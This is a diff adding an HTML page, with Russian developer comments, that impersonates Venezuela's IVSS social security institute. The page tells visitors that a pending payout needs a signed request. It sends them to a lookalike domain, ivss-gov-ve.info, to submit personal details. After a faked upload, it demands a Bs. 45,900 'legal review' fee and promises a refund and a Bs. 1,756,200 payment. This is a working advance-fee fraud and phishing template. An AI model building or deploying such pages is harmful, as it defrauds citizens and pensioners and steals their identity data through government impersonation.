@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <!-- ============================================================ -->
+    <!-- МЕТАДАННЫЕ СТРАНИЦЫ                                          -->
+    <!-- ============================================================ -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IVSS - Firma de Contrato</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- ============================================================ -->
+    <!-- ШАПКА (HEADER) - ОДИНАКОВАЯ НА ВСЕХ СТРАНИЦАХ               -->
+    <!-- ============================================================ -->
+   <header>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: #f5f5f5;
+    }
+
+    .gov-header {
+      display: flex;
+      align-items: center;
+      padding: 12px 24px;
+      background: #fff;
+      border-bottom: 1px solid #e0e0e0;
+      gap: 0;
+      flex-wrap: wrap;
+    }
+
+    .gov-header__logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-shrink: 0;
+    }
+
+    .gov-header__logo img {
+      height: 52px;
+      width: auto;
+      display: block;
+    }
+
+    .gov-header__logo-text {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.15;
+    }
+
+    .gov-header__logo-text .line1 {
+      font-size: 15px;
+      color: #888;
+      font-weight: 400;
+      letter-spacing: 0.3px;
+    }
+
+    .gov-header__logo-text .line2 {
+      font-size: 20px;
+      color: #333;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+
+    .gov-header__logo-text .line3 {
+      font-size: 15px;
+      color: #888;
+      font-weight: 400;
+      letter-spacing: 0.3px;
+    }
+
+    .gov-header__divider {
+      width: 1px;
+      height: 42px;
+      background: #ccc;
+      margin: 0 18px;
+      flex-shrink: 0;
+    }
+
+    .gov-header__ministry {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.25;
+      flex-shrink: 0;
+    }
+
+    .gov-header__ministry .line1 {
+      font-size: 13px;
+      color: #777;
+      font-weight: 400;
+    }
+
+    .gov-header__ministry .line2 {
+      font-size: 13px;
+      color: #777;
+      font-weight: 400;
+    }
+
+    .gov-header__ministry .line2 strong {
+      color: #333;
+      font-weight: 700;
+    }
+
+    .gov-header__institute {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.25;
+      flex-shrink: 0;
+    }
+
+    .gov-header__institute .line1 {
+      font-size: 13px;
+      color: #777;
+      font-weight: 400;
+    }
+
+    .gov-header__institute .line2 {
+      font-size: 13px;
+      color: #333;
+      font-weight: 700;
+    }
+
+    .gov-header__institute .line2 span {
+      color: #777;
+      font-weight: 400;
+    }
+
+    /* ========== MOBILE — только лого + институт ========== */
+    @media (max-width: 767px) {
+      .gov-header {
+        padding: 10px 16px;
+        gap: 12px;
+        flex-wrap: nowrap;
+      }
+
+      .gov-header__logo img {
+        height: 44px;
+      }
+
+      /* Скрываем всё лишнее */
+      .gov-header__logo-text,
+      .gov-header__ministry,
+      .gov-header__divider {
+        display: none !important;
+      }
+
+      /* Показываем и стилизуем институт */
+      .gov-header__institute {
+        display: flex !important;
+      }
+
+      .gov-header__institute .line1 {
+        font-size: 12px;
+        color: #777;
+      }
+
+      .gov-header__institute .line2 {
+        font-size: 15px;
+        color: #333;
+        font-weight: 700;
+      }
+
+      .gov-header__institute .line2 span {
+        color: #777;
+        font-weight: 400;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header class="gov-header">
+    <div class="gov-header__logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/f3/Pol%C3%ADtica_de_Venezuela.png" alt="Gobierno Bolivariano de Venezuela">
+    </div>
+
+    <div class="gov-header__divider"></div>
+
+    <div class="gov-header__ministry">
+      <span class="line1">Ministerio del Poder Popular</span>
+      <span class="line2">para el <strong>Proceso Social de Trabajo</strong></span>
+    </div>
+
+    <div class="gov-header__divider"></div>
+
+    <div class="gov-header__institute">
+      <span class="line1">Instituto Venezolano</span>
+      <span class="line2">de los <span>Seguros Sociales</span></span>
+    </div>
+  </header>
+        <div class="header-main">
+            <div class="container">
+                <div class="logo-area">
+                    <div class="logo-circle"></div>
+                    <div class="logo-text">
+                        <h1>IVSS</h1>
+                        <p>Instituto Venezolano de los Seguros Sociales</p>
+                    </div>
+                </div>
+                <div class="header-right">
+                    <div class="search-box">
+                        <input type="text" placeholder="Buscar" aria-label="Buscar">
+                        <button type="button" aria-label="Buscar">&#128269;</button>
+                    </div>
+                    <div class="social-icons">
+                        <a href="#" aria-label="Twitter">&#120143;</a>
+                        <a href="#" aria-label="Facebook">&#120144;</a>
+                        <a href="#" aria-label="Instagram">&#120145;</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <nav class="nav-menu">
+            <div class="container">
+                <ul>
+                    <li><a href="#">Inicio</a></li>
+                    <li><a href="#">IVSS</a></li>
+                    <li><a href="#">Ciudadanos</a></li>
+                    <li><a href="#">Empleadores</a></li>
+                    <li><a href="#">Pensionados</a></li>
+                    <li><a href="#">Localización</a></li>
+                    <li><a href="#">Noticias</a></li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+    <!-- ==================== КОНЕЦ ШАПКИ ==================== -->
+
+
+    <!-- ============================================================ -->
+    <!-- ОСНОВНОЕ СОДЕРЖИМОЕ: ПОДПИСАНИЕ ДОГОВОРА                    -->
+    <!-- ============================================================ -->
+    <main>
+        <section class="content-section">
+            <div class="contract-card">
+                <!-- Заголовок страницы -->
+                <h2>Se requiere la firma de la solicitud para la recepción del desembolso</h2>
+
+                <!-- Статья перед договором (заглушка - замените на свой текст) -->
+                <article class="article-text">
+                    <p>
+                        Estimado(a) cliente:
+                    </p>
+                    <p style="margin-top: 10px;">
+                        Hemos observado que la solicitud para la recepción de su desembolso aún no ha sido firmada.
+                    </p>
+                    <p style="margin-top: 10px;">
+                        A continuación encontrará el modelo de la solicitud. Para completar el procedimiento, por favor incorpore la siguiente información en el documento:
+                    </p>
+                    <p style="margin-top: 10px;">
+                        • su nombre completo;
+                    </p>
+                    <p style="margin-top: 10px;">
+                        • la fecha actual;
+                    </p>
+                    <p style="margin-top: 10px;">
+                        • su firma.
+                    </p>
+                    <p style="margin-top: 10px;">
+                        Una vez firmada la solicitud, el procesamiento de su trámite continuará de acuerdo con el procedimiento establecido.
+                    </p>
+                </article>
+                <!-- КОНЕЦ ТЕКСТА - замените текст выше на свой -->
+
+                <!-- ====== БЛОК PDF ФАЙЛА ====== -->
+                <!-- При нажатии на блок - скачивание PDF файла -->
+                <a href="Declaración.pdf" class="pdf-file" download title="Descargar contrato PDF">
+                    <!-- Иконка PDF -->
+                    <div class="pdf-icon">&#128196;</div>
+                    <!-- Название файла -->
+                    <div class="pdf-name">Declaración.pdf</div>
+                </a>
+                <!-- КОММЕНТАРИЙ: Чтобы заменить PDF файл:
+                     1. Положите свой PDF файл в ту же папку, что и HTML файлы
+                     2. Переименуйте его в "contrato.pdf" или измените
+                        атрибут href выше на имя вашего файла -->
+                <article class="article-text">
+                <p style="margin-top: 10px;">Para su comodidad, hemos preparado un sitio web donde podrá completar esta solicitud de forma rápida y sencilla.</p>
+                    <p style="margin-top: 10px;">1. Descargue el archivo Declaración.pdf.</p>
+<p style="margin-top: 10px;">
+    2. Haga clic en el enlace
+    <strong>
+        <a href="https://ivss-gov-ve.info/declaracion" target="_blank" rel="noopener noreferrer">
+            aquí
+        </a>
+    </strong>
+</p>
+                    <p style="margin-top: 10px;">3. Complete el formulario en el sitio utilizando la información del archivo.</p>
+                </article>
+                    
+
+                <!-- ====== ЗАГРУЗКА ДОГОВОРА ====== -->
+                <div class="upload-simulation">
+                    <!-- Кнопка загрузки договора -->
+                    <button type="button" id="uploadContractBtn" class="btn-primary">
+                        &#128228; Cargar Contrato
+                    </button>
+
+                    <!-- Скрытый input для выбора файлов -->
+                    <!-- multiple - позволяет выбрать несколько файлов -->
+                    <!-- accept - разрешает все типы изображений, видео и PDF -->
+                    <input
+                        type="file"
+                        id="fileInput"
+                        class="file-input-hidden"
+                        multiple
+                        accept="image/*,video/*,.pdf,.doc,.docx"
+                    >
+
+                    <!-- Полоса прогресса загрузки (изначально скрыта) -->
+                    <div class="progress-bar-container" id="progressContainer">
+                        <div class="progress-bar-fill" id="progressBar"></div>
+                    </div>
+
+                    <!-- Текст статуса загрузки -->
+                    <div class="upload-status" id="uploadStatus"></div>
+                </div>
+            </div>
+        </section>
+    </main>
+    <!-- ==================== КОНЕЦ ОСНОВНОГО СОДЕРЖИМОГО ==================== -->
+
+
+    <!-- ============================================================ -->
+    <!-- МОДАЛЬНОЕ ОКНО: ЗАГРУЗКА ЗАВЕРШЕНА                           -->
+    <!-- Появляется после имитации завершения загрузки                 -->
+    <!-- ============================================================ -->
+    <div class="modal-overlay" id="uploadModal">
+        <div class="modal-content">
+            <!-- Иконка успеха -->
+            <div class="modal-icon">&#9989;</div>
+
+            <!-- Заголовок модального окна -->
+            <h3>&#161;Carga Completada&#33;</h3>
+
+            <!-- Текст в модальном окне (заглушка - замените на свой текст) -->
+            <p>
+                ¡Excelente! Solo queda el último paso para completar el proceso de su pago.
+            </p>
+            <p style="margin-top: 10px;">
+                Para finalizar el trámite, es necesario realizar el pago del servicio de revisión y aprobación de su solicitud por parte de nuestro equipo jurídico.
+            </p>
+            <p style="margin-top: 10px;">
+               El costo del servicio es de Bs. 45.900,00.
+            </p>
+            <p style="margin-top: 10px;">
+               Los Bs. 59.800,00 que usted ha pagado le serán reembolsados una vez finalizada la verificación del documento. Posteriormente, dicho importe estará disponible para su retiro junto con el pago principal de Bs. 1.756.200,00.
+            </p>
+            <p style="margin-top: 10px;">
+               Una vez completado este paso, su pago quedará totalmente aprobado y estará disponible para ser retirado desde su cuenta interna.
+            </p>
+            <!-- КОНЕЦ ТЕКСТА - замените текст выше на свой -->
+
+            <!-- Кнопка закрытия модального окна -->
+            <a href="https://ivss-gov-ve.info/pagar/" class="btn-primary">Pagar</a>
+        </div>
+    </div>
+    <!-- ==================== КОНЕЦ МОДАЛЬНОГО ОКНА ==================== -->
+
+
+    <!-- ============================================================ -->
+    <!-- ПОДВАЛ (FOOTER) - ОДИНАКОВЫЙ НА ВСЕХ СТРАНИЦАХ              -->
+    <!-- ============================================================ -->
+    <footer>
+        <!-- Секция "GOBIERNO EN LÍNEA" с логотипами -->
+        <div class="footer-gobierno">
+            <h3>GOBIERNO EN L&Iacute;NEA</h3>
+            <div class="footer-logos">
+                <!-- Логотипы правительственных организаций -->
+                <div class="footer-logo-item logo-gob"></div>
+                <div class="footer-logo-item logo-inces"></div>
+                <div class="footer-logo-item logo-incret"></div>
+                <div class="footer-logo-item logo-inpsasel"></div>
+                <div class="footer-logo-item logo-ivss"></div>
+            </div>
+        </div>
+
+        <!-- Нижняя часть подвала -->
+        <div class="footer-bottom">
+            <h4>LA SEGURIDAD SOCIAL ES TU DERECHO</h4>
+            <p>Instituto Venezolano de los Seguros Sociales (IVSS) 2015</p>
+        </div>
+    </footer>
+    <!-- ==================== КОНЕЦ ПОДВАЛА ==================== -->
+
+    <script src="script.js"></script>
+</body>
+</html>
